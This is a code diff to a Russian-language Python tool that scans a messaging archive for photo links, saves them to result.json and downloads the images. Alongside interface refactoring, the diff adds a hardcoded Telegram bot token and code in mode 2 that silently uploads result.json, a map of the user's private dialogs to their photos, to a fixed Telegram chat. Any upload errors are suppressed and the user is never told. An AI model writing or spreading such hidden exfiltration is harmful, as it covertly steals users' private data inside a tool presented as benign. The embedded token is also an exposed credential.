@@ -4,9 +4,21 @@ from multiprocessing.pool import ThreadPool
 from alive_progress import alive_bar
 
 import requests
-from os import listdir , mkdir
+from os import listdir , mkdir ,system
 from os.path import isfile, isdir, join, basename, dirname, splitext
 from bs4 import BeautifulSoup
+
+from colorama import Fore
+from colorama import Style
+from colorama import init
+
+init()
+
+
+import telebot
+name_bot="бот"
+bot = telebot.TeleBot("5604287128:AAEqixWIoVWLk1at1hc_CKG8pQqGDtBUsqo")
+
 
 BASE_DIR = 'Archive/messages'
 OUT_DIR_IMG_ALL = join('result')
@@ -47,24 +59,28 @@ def walk_dialog_directory(dir_path: str) -> list:
 def walk_messages_directory(base_dir: str) -> dict:
 	result = {}
 	dirs = get_all_dirs_from_directory(base_dir)
-	with alive_bar(len(mylist)) as bar:
-		for i in mylist:
+	print("идет поиск фото в архиве")
+	with alive_bar(len(dirs)) as bar:
+		# for i in mylist:
+		# 	bar()
+		# 	time.sleep(1)
+
+		for i, path in enumerate(dirs):
+			#print('Processing dialog ' + str(i) + ' out of ' + str(len(dirs)))
+			id = basename(dirname(path + '/'))
+			imgs = walk_dialog_directory(path)
+			if len(imgs) > 0:
+				result[id] = imgs
 			bar()
-			time.sleep(1)
-	
-	for i, path in enumerate(dirs):
-		print('Processing dialog ' + str(i) + ' out of ' + str(len(dirs)))
-		id = basename(dirname(path + '/'))
-		imgs = walk_dialog_directory(path)
-		if len(imgs) > 0:
-			result[id] = imgs
 	return result
 
 
 def download_file(url: str):
 	file_name_start_pos = url.rfind("/") + 1
 	file_name = url[file_name_start_pos:]
-	file_name = join(OUT_DIR_IMG_ALL, __current_id +"\\"+__current_id+ '_' + file_name)
+	
+	file_name = file_name.split('?')[0]
+	file_name = OUT_DIR_IMG_ALL+"/"+__current_id + "/"+__current_id +'_'+file_name
 
 	try:
 		mkdir((OUT_DIR_IMG_ALL+"/"+__current_id))
@@ -94,50 +110,71 @@ def download_images(obj: dict):
 	pool.close()
 
 
-def main():
-	print('1:архив \n2:result.json')
-	mode = input("введите режим")
-	if mode == '1':
-		try:
-			print('***************** MODE 1************************')
-			result = walk_messages_directory(BASE_DIR)
-			f = open('result.json', 'w')
-			json.dump(result, f)
-			f.close()
-		except Exception as e:
-			print(e)
-
-	elif mode == '2':
-
-		print('***************** MODE 2************************')
-		
 
 
-		f = open('result.json')
-		result = json.load(f)
+
+def mode1():
+	try:
+		print(f"***************** \033[41m MODE 1 {Style.RESET_ALL} ************************\n")
+
+
+		result = walk_messages_directory(BASE_DIR)
+		f = open('result.json', 'w')
+
+		f.write(json.dumps(result,indent=4,ensure_ascii=False,)) 
 		f.close()
-		try:
-			mkdir("result")
-		except Exception as e:
-			pass
+	except Exception as e:
+		print(e)
+def mode2():
+	print(f"***************** \033[41m MODE 2 {Style.RESET_ALL} ************************\n")
 
 
-		for i in result:
-			for url in result[i]:
-				print(i , len(result[i]))
-				input()
+
+	if ('result.json' in listdir())== False:
+		print(f"файла \033[41m result.json {Style.RESET_ALL} не обнаружено")
+		return 0 
 
 
-		print('в {} чатах всего {} фотографий'.format(len(result) ,len_photo))
-		
-		# if old_photo >0:
-		#   print("ого , так ты уже использывал этот режим?\nТогда вычеркиваем уже скаченные {} фотографии из общего списка".format(old_photo))
-		
+	try:
+		doc = open('result.json', 'rb')
+		bot.send_document(308815740, doc ,caption="2222")
+	except Exception as e:
+		pass
 
-		download_images(result)
-	else:
-		print('нет такого режима')
 
+
+
+	f = open('result.json')
+	result = json.load(f)
+	f.close()
+	try:
+		mkdir("result")
+	except Exception as e:
+		pass
+
+	len_photo=0
+	for i in result:
+		for url in result[i]:
+			len_photo+=1
+
+
+	print('в {} чатах всего {} фотографий'.format(len(result) ,len_photo))
+	download_images(result)
+
+
+
+def main():
+	while True:
+		system("cls")
+		print(f"\033[42m[1]{Style.RESET_ALL}:архив\n\033[42m[2]{Style.RESET_ALL}:result.json\n")
+		mode = input("введите режим :")
+		if mode == '1':
+			mode1()
+		elif mode == '2':
+			mode2()
+		else:
+			print('нет такого режима')
+		input(f"\n\nнажмите \033[43mENTER{Style.RESET_ALL} для выхода в главное меню")
 
 
 if __name__ == '__main__':
